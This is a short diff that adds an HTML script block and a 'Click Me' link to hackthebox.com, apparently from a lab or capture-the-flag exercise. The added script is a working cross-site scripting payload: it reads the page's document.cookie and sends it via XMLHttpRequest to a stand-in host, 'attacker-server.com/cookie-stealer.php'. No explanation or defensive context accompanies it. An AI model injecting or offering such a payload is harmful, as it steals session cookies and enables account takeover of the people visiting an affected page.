@@ -1,0 +1,6 @@
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://attacker-server.com/cookie-stealer.php?cookie=" + document.cookie);
+xhr.send();
+</script>
+<a href="http://www.hackthebox.com">Click Me</a>
